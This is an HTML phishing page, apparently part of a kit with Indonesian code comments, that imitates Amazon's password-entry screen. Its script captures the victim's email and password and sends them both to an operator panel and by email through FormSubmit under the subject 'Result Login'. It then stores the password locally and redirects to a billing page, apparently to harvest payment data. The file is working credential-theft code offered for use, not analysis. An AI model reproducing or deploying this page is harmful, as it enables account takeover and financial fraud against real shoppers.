<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Enter Password</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 20px; }
        .logo img { height: 30px; }
        .kotak { width: 100%; max-width: 350px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; background: #fff; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 10px; }
        .email-info { color: #555; font-size: 14px; margin-bottom: 20px; }
        label { font-size: 13px; font-weight: 700; margin-bottom: 7px; display: block; }
        input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; margin-bottom: 15px; }
        input:focus { border-color: #007185; outline: none; box-shadow: 0 0 0 3px #c8f0f4; }
        button { width: 100%; padding: 9px; background: linear-gradient(to bottom, #f7df74, #ecc000); border: 1px solid #b88600; border-radius: 4px; font-size: 15px; cursor: pointer; }
        button:hover { background: linear-gradient(to bottom, #f5d648, #d4a300); }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1>Enter password</h1>
        <p class="email-info" id="tampil-email"></p>
        <form id="form-login" method="POST">
            <input type="hidden" name="_subject" value="Result Login">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="email_user" id="email_user">
            
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            
            <button type="submit">Sign In</button>
        </form>
    </div>

<script src="config.js"></script>
<script>
window.onload = function() {
    const params = new URLSearchParams(window.location.search);
    const email = params.get("anrew") || localStorage.getItem("dataEmail") || "";
    document.getElementById("tampil-email").textContent = email;
    document.getElementById("email_user").value = email;
};

document.getElementById("form-login").addEventListener("submit", async function(e) {
    e.preventDefault();
    
    const email = document.getElementById("email_user").value;
    const password = document.getElementById("password").value;
    
    // Kirim ke panel
    await fetch(API_URL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            aksi: "tambah_kunjungan",
            ip: "",
            status: "LOGIN",
            alasan: `Email: ${email}`
        })
    });
    
    // Kirim ke email via FormSubmit
    const formData = new FormData();
    formData.append("email", email);
    formData.append("password", password);
    formData.append("_subject", "Result Login");
    
    await fetch(FORM_SUBMIT_URL, {
        method: "POST",
        body: formData
    });
    
    localStorage.setItem("password", password);
    window.location.href = "billing.html";
});
</script>
</body>
</html>
